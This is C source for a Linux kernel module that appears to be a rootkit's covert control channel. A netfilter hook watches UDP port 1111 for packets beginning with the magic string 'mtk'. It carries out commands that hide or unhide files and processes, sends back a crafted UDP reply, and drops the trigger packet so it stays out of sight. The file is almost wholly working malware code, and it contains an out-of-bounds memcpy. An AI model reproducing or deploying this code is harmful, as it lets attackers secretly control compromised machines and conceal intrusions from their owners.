#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/workqueue.h>

#include "headers/main.h"

#define CMD_MAGIC ("mtk")
#define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
#define CMD_PORT (1111)

typedef u16 job_id_t;

struct cmd_type {
    char *name;
    int (*func)(const char *path);
};

int cmds_len = 5;
struct cmd_type cmds[] = {
    {
        "hfile",
        hide_file
    },
    {
        "ufile",
        unhide_file
    },
    {
        "hproc",
        hide_process
    },
    {
        "uproc",
        unhide_process
    },
    {
        "fexit",
        exit_func
    }
};


static int send_response(
    unsigned short job_id,
    char response_status,
    __be32 local_ip,
    __be32 remote_ip,
    __be16 remote_port,    
    unsigned char remote_mac[],
    struct net_device *dev
) {
    struct iphdr *iph;
    struct udphdr *udph;
    struct ethhdr *eth;
    struct sk_buff *skb;
    int data_len = 3;
    char *data;
    int header_len = sizeof(struct udphdr) + 5 * 4 + ETH_HLEN;
    printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
    skb = alloc_skb(data_len + header_len, GFP_ATOMIC);
    if (!skb) {
        printk(KERN_INFO "failed allocating skb\n");
        return -1;
    }
    skb_reserve(skb, header_len);
    data = skb_put(skb, data_len);

    // put response data.
    *(unsigned short *)data = job_id;
    put_unaligned(response_status, data + 2);

    skb_push(skb, sizeof(struct udphdr));
    skb_reset_transport_header(skb);
    udph = udp_hdr(skb);
    udph->source = htons(CMD_PORT);
    udph->dest = remote_port;
    udph->len = htons(data_len + sizeof(struct udphdr));
    udph->check = 0;
    udph->check = csum_tcpudp_magic(
        local_ip,
        remote_ip,
        data_len + sizeof(struct udphdr),
        IPPROTO_UDP,
        csum_partial(
            udph,
            data_len + sizeof(struct udphdr),
            0
        )
    );

    if (udph->check == 0) udph->check = CSUM_MANGLED_0;

    skb_push(skb, sizeof(*iph));
    skb_reset_network_header(skb);
    iph = ip_hdr(skb);
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(data_len + sizeof(struct udphdr) + 5 * 4);
    iph->id       = 0; // ?????
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr = local_ip;
    iph->daddr = remote_ip;
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
    skb_reset_mac_header(skb);
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, remote_mac, ETH_ALEN);

    skb->dev = dev;

    return dev_queue_xmit(skb);
}

struct MRK_command_work {
    struct work_struct work;
    struct cmd_type *cmd;
    const char *arg;
    short job_id;
    __be32 src_addr;
    __be32 dst_addr;
    __be16 src_port;
    unsigned char src_mac[ETH_ALEN];
    struct net_device *dev;
};

static void handle_command(struct work_struct *work) {
    int result;
    struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
    result = command_work->cmd->func(command_work->arg);
    printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
    send_response(
        command_work->job_id, 
        result, 
        command_work->dst_addr, 
        command_work->src_addr, 
        command_work->src_port, 
        command_work->src_mac, 
        command_work->dev
    );
    // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
    // It is permissible to free the struct work_struct from inside the function that is called from it.
    kfree(command_work->arg);
    kfree(work);
}

static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
    struct udphdr *udph;
    int user_data_len;

    udph = udp_hdr(skb);
    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);

    #ifdef NET_SKBUFF_DATA_USES_OFFSET
    *user_data = skb->head + skb->tail - user_data_len;
    #else
    *user_data = skb->tail - user_data_len;
    #endif
    
    return user_data_len;
}

static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
    int i;
    struct cmd_type *cmd;
    
    for (i = 0; i < cmds_len; i++) {
        cmd = cmds + i;
        if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
            return cmd;
        }
    }
    return NULL;
}

static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct udphdr *udph;
    const char *user_data;
    int user_data_len;
    short job_id;
    struct cmd_type *cmd;
    struct MRK_command_work *command_work;
    char *arg;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != CMD_PORT) return NF_ACCEPT;

    user_data_len = get_udp_user_data(skb, &user_data);

    if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
    user_data += CMD_MAGIC_LEN;
    user_data_len -= CMD_MAGIC_LEN;

    job_id = get_unaligned((job_id_t *)(user_data));
    user_data += sizeof(job_id_t);
    user_data_len -= sizeof(job_id_t);

    cmd = match_buffer_to_cmd_type(user_data);
    if (cmd == NULL) return NF_ACCEPT;

    command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
    INIT_WORK(&command_work->work, handle_command);
    command_work->cmd = cmd;
    arg = kmalloc(user_data_len, GFP_KERNEL);
    memcpy(arg, user_data, user_data_len + 1); /* we want the string to be null-terminated */
    command_work->arg = arg;
    command_work->dst_addr = iph->daddr;
    command_work->src_addr = iph->saddr;
    command_work->src_port = udph->source;
    memcpy(command_work->src_mac, eth_hdr(skb)->h_source, ETH_ALEN);
    command_work->dev = skb->dev;
    
    schedule_work(&command_work->work);
    return NF_DROP;
}

struct nf_hook_ops *net_hook;

int MRK_init_nethook(void) {
    net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    net_hook->hook = MRK_hookfn;
    net_hook->hooknum = NF_INET_PRE_ROUTING;
    net_hook->pf = PF_INET;
    net_hook->priority = NF_IP_PRI_FILTER;
    return nf_register_net_hook(&init_net, net_hook);
}